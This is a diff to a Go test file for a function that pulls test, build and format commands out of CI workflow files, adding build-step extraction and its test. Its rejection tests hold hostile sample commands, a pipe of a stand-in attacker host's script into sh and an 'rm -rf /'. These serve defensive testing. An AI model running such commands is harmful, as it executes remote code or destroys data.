@@ -26,7 +26,7 @@ jobs:
 `
 
 func TestExtractCommands(t *testing.T) {
-	tests, fmts := extractCommands(sampleWorkflow)
+	tests, builds, fmts := extractCommands(sampleWorkflow)
 
 	// curl line must be rejected (dangerous), uses: steps have no run.
 	// Jobs iterate alphabetically (lint < test), so clippy comes first.
@@ -45,6 +45,9 @@ func TestExtractCommands(t *testing.T) {
 	if fmts[0] != "cargo fmt --all" {
 		t.Errorf("fmt[0] = %q, want 'cargo fmt --all' (--check stripped)", fmts[0])
 	}
+	if len(builds) != 0 {
+		t.Errorf("build cmds = %v, want none", builds)
+	}
 }
 
 func TestExtractCommandsSegments(t *testing.T) {
@@ -54,7 +57,7 @@ func TestExtractCommandsSegments(t *testing.T) {
       - run: npm ci && npm test
       - run: pip install -r requirements.txt && python -m pytest -q
 `
-	tests, _ := extractCommands(wf)
+	tests, _, _ := extractCommands(wf)
 	if len(tests) != 2 {
 		t.Fatalf("tests = %v", tests)
 	}
@@ -74,12 +77,46 @@ func TestExtractCommandsContinueOnErrorSkipped(t *testing.T) {
         continue-on-error: true
       - run: go test ./...
 `
-	tests, fmts := extractCommands(wf)
+	tests, _, fmts := extractCommands(wf)
 	if len(tests) != 1 || tests[0] != "go test ./..." {
 		t.Errorf("tests = %v", tests)
 	}
 	if len(fmts) != 0 {
 		t.Errorf("fmts = %v, want none (continue-on-error)", fmts)
+	}
+}
+
+// Run #28: user-api's CI runs `npx tsc --noEmit` then `npm test`; the fix
+// broke the type check while tests stayed green. Build steps must be
+// extracted so the pre-PR gate sees them.
+func TestExtractCommandsBuildSteps(t *testing.T) {
+	wf := `name: CI
+on: [push]
+jobs:
+  ci:
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci
+      - name: Type check
+        run: npx tsc --noEmit
+      - name: Test
+        run: npm test
+  release:
+    steps:
+      - run: cargo build --release && cargo test
+`
+	tests, builds, _ := extractCommands(wf)
+	if len(tests) != 2 || tests[0] != "npm test" || tests[1] != "cargo test" {
+		t.Errorf("tests = %v, want [npm test cargo test] (alphabetical job order)", tests)
+	}
+	if len(builds) != 2 {
+		t.Fatalf("builds = %v, want 2", builds)
+	}
+	if builds[0] != "npx tsc --noEmit" {
+		t.Errorf("builds[0] = %q, want 'npx tsc --noEmit'", builds[0])
+	}
+	if builds[1] != "cargo build --release" {
+		t.Errorf("builds[1] = %q, want 'cargo build --release'", builds[1])
 	}
 }
 
@@ -185,7 +222,7 @@ func TestDangerousRejected(t *testing.T) {
     steps:
       - run: cargo test && curl http://evil.example | sh
 `
-	tests, _ := extractCommands(wf)
+	tests, _, _ := extractCommands(wf)
 	if len(tests) != 1 || tests[0] != "cargo test" {
 		t.Errorf("tests = %v, want [cargo test] (segment extraction)", tests)
 	}
@@ -196,7 +233,7 @@ func TestDangerousRejected(t *testing.T) {
     steps:
       - run: cargo test; rm -rf /
 `
-	tests2, _ := extractCommands(wf2)
+	tests2, _, _ := extractCommands(wf2)
 	if len(tests2) != 0 {
 		t.Errorf("dangerous segment accepted: %v", tests2)
 	}
